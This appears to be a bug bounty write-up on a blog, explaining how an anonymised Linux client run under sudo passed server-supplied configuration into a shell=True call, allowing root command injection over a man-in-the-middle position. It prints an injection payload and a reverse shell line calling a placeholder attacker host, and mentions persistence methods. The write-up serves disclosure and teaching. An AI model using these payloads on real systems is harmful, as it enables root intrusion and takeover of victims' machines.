---
title:       "Root command injection over MITM: the server writes your command line"
summary:     "A console tool running under sudo downloaded its configuration from the server and pasted it, verbatim, into a shell call. One semicolon in the right place and the attacker is root. Report accepted and rewarded."
date:        2026-10-29 21:10:00 +0100
lang:        en
ref:         rce-cli-shell-true
image:       /assets/img/og/rce-cli-shell-true-en.png
permalink:   /en/writeups/server-controlled-config-shell-rce/

severity:    high
cvss:        "8.0"
cvss_vector: "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
cwe:         "CWE-78 · CWE-88"
vuln_class:  "Injection"
target_type: "Desktop client (Linux)"
platform:    "YesWeHack"
status:      "Fixed"
reward:      "Rewarded"
tags:        [rce, linux, shell, mitm, root, command-injection, python]

takeaways:
  - "`shell=True` turns a string into a program. If part of that string comes from the network, the server writes your command line."
  - "\"But the attacker needs a MITM\" is not an excuse: if the program's scope contemplates it, it is a precondition, not a barrier."
  - "When a client accepts **options** from a server, you need an allowlist. Filtering odd characters always falls short."
  - "The program's own error message showed me the command it had built. Reading errors slowly is worth more than many payloads."
---

This is the second bug I am publishing, and it is one of those that sticks with you: **the
server literally decides which command your computer runs as root**. No buffer to overflow,
no exotic architecture to understand. Just one programming decision that millions of
scripts get wrong every day.

<div class="warn" markdown="1">
**Everything is anonymised.** The program authorised publication on condition the product
is not identifiable. I have changed the vendor, the kind of application, the hosts, class
and method names and the version numbers. **The mechanism and the bug are exact.**
</div>

## The target, in one sentence

A **Linux command-line tool** that is part of a desktop application. To work it needs
administrator privileges, so it runs under `sudo` — documented and normal in its case: it
has to touch the system's network configuration.

When you ask it to connect, it does this:

1. Asks the vendor's server for the connection parameters.
2. Uses those parameters to build the command that will launch a system binary.
3. Runs that command.

Three steps. The bug lives entirely in the jump from 1 to 3.

## The line that changes everything

Reading the tool's code (it shipped packaged, but it can be extracted) I found the point
where it runs the command:

```python
# libs/helpers.py
def execute_command(cmd):
    process = subprocess.Popen(cmd, shell=True)
    ...
```

`subprocess` is how Python runs programs. It can do it two ways, and
the difference is everything:

- **Without a shell** (`shell=False`): you pass a list — *"run the program `ping`, with the
  argument `8.8.8.8`"*. Python hands it to the operating system as is. If the argument
  contains a semicolon, it is a semicolon; one more character of text.
- **With a shell** (`shell=True`): you pass **a whole sentence** and Python hands it to
  `/bin/sh` to interpret. And the shell does understand the semicolon: it means *"one
  command ends here and another begins"*.

The first option treats your data as data. The second treats it as **code**.

See for yourself, it takes ten seconds:

```python
import subprocess

target = "8.8.8.8; touch /tmp/i-got-in"

# safe form: the semicolon is just a character in the argument
subprocess.run(["ping", "-c1", target])          # ping fails, nothing created

# unsafe form: the shell interprets the semicolon
subprocess.run(f"ping -c1 {target}", shell=True) # the file appears
```

<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/04-shell-true-en.svg' | relative_url }}"
       alt="Diagram: on the left an argument list, where the semicolon is just a character; on the right a string with shell=True, where the shell reads it as a command separator">
  <figcaption>The same order down both paths. On the left data stays data; on the right it has become code.</figcaption>
</figure>

## And what was it putting inside that string?

The usual question: **where do the pieces of the command come from?** I followed the
construction backwards:

```python
# the client downloads a block of text with the configuration
response = requests.get(f"https://api.example.tld/v2/my/servers/{server_id}/configs")
blob     = response.json()["clientdata"]

# splits it into lines and words, filtering nothing
parameters = parse_config(blob)

# and pastes it into the final command
cmd = "sudo {} {} {}".format(binary, " ".join(parameters), filters)
execute_command(cmd)      # <- shell=True
```

The program asks the server "tell me how to connect". The server
answers with text. The program splits that text into pieces and **pastes them into the
sentence** it is about to run as root. It does not check which options are valid, nor
whether the values contain dangerous characters. Whatever the server says, runs.

Put another way: **the server has write access to your command line**.

## "But for that you have to be the server"

Exactly, and this is where a lot of people give up. I nearly did too.

For this to fire, the attacker has to answer that HTTPS request: they have to be **in the
middle** of the connection. That is called a man in the middle (MITM), and it sounds like
an impossible condition.

It is not that impossible:

- Public wifi with a preinstalled root certificate (hotels, airports, cafés with a captive
  portal).
- A company laptop with a corporate certificate installed for traffic inspection. That is
  utterly normal and exists in almost every large organisation.
- A compromised intermediate certificate authority — it has happened several times.
- An insider with access to the network provider.

And the decisive bit: **the bug bounty program itself listed it explicitly in scope**, under
*"arbitrary code execution by staging MITM attacks"*. If the program contemplates it, it is
not an excuse not to report: it is a **declared precondition**.

<div class="note" markdown="1">
This matters for anyone starting out. Before dismissing a bug because "it needs an unusual
condition", **read the program's scope**. Many list exactly which preconditions they accept.
If yours is on that list, your finding counts.
</div>

And what turns the precondition into a product flaw: the client **did not check which
certificate** it was accepting beyond the system's normal validation. Another part of the
same product did — it pinned the expected certificate — but this one did not. That
inconsistency was half the report.

## Building the lab

Everything on a disposable virtual machine, playing both roles: attacker and victim.

```bash
# 1 · create my own certificate authority and trust it system-wide
openssl req -x509 -newkey rsa:4096 -nodes -days 1 \
        -keyout ca.key -out ca.crt -subj "/CN=LAB-CA"
sudo cp ca.crt /usr/local/share/ca-certificates/lab.crt && sudo update-ca-certificates

# 2 · issue a certificate for the vendor's domain, signed by my CA
#     (in a real attack this comes from the wifi, the corporate proxy or the compromised CA)

# 3 · point the domain at my own machine
echo "127.0.0.1  api.example.tld" | sudo tee -a /etc/hosts

# 4 · run a proxy that forwards EVERYTHING to the real server...
#     ...except the configuration request, which I answer myself
```

I set up a fake server impersonating the vendor's. I forward almost
everything to the real one so the application notices nothing odd: login works, the server
list works, everything normal. **I intercept one single request**: the one carrying the
configuration. That one I answer myself.

<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/05-mitm-en.svg' | relative_url }}"
       alt="Diagram of the setup: the victim's client talks to the attacker's proxy, which forwards every request to the real server except the configuration one, whose response it replaces">
  <figcaption>Three of the four requests pass untouched. Only the response that matters is replaced.</figcaption>
</figure>

## The payload

The fake server returns the configuration with one poisoned line:

```
cipher aes-256-gcm; id > /tmp/pwn; touch /tmp/marker; #
```

Three pieces, each doing a job:

| Piece | What it is for |
|---|---|
| `cipher aes-256-gcm` | Looks like a legitimate configuration option. A quick glance sees nothing odd |
| `; id > /tmp/pwn; touch /tmp/marker` | The **semicolons** close the previous command and open mine |
| `#` | Comments out whatever the program appends afterwards, so it does not get in the way |

The program was going to run `sudo binary --options...`. My text slips
into the middle, the semicolon cuts the sentence there, my commands run, and the hash makes
the shell ignore the rest. It is exactly the same as a SQL injection, except the database
is your operating system.

## Firing it

The victim types the product's normal, documented command. One. The one they would type any
day.

And then something happened that I did not expect and that improved the report: **the
program failed and, on failing, printed the command it had built**.

The system binary died because the hash left its order half-finished. On
dying, the program printed an error containing the full sentence it had tried to run —
**with my payload inside, in plain sight**. The program's failure is the proof of the
program's failure. That is gold for a report: you do not have to convince anyone of what
happened, the tool shows it.

And the important bit: the commands **had already run** before the binary died. The shell
interprets the list from left to right.

That is the proof that counts: **the file was created by `uid=0`**, not by the user. And no
connection was established, so the user just saw a connection error and tried again —
firing the payload once more.

## Part two: from "I can run commands" to "I am inside"

A marker in `/tmp` demonstrates the mechanism, but it does not tell a security lead *how
much* it hurts. So I swapped the payload for a **reverse shell**:

```
cipher aes-256-gcm; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' & id > /tmp/pwn; #
```

Instead of creating a file, I tell the victim's computer to open a
connection **towards me** and hand me a console. From then on I type in my terminal and the
commands run on their machine, as root. It is not a metaphor: it is their computer, on my
screen.

Demonstrating the jump from "I can run a command" to "I have a session" is what turns a
*Medium* into a *High*. Same bug, very different impact in the eyes of whoever triages it.

## Impact

<div class="impact" markdown="1">
**Impact.** Command execution as **root** on any Linux machine with the client installed,
with the victim performing exactly one action: the command the product itself documents.
The attacker's code runs **before** the connection is established, so it can install
persistence (`authorized_keys`, a scheduled task, a system service) in milliseconds.
Changing the account password achieves nothing: the attacker is no longer in the account,
they are on the machine. The only reliable cleanup is reinstalling the operating system,
and the victim has no reason to suspect it.
</div>
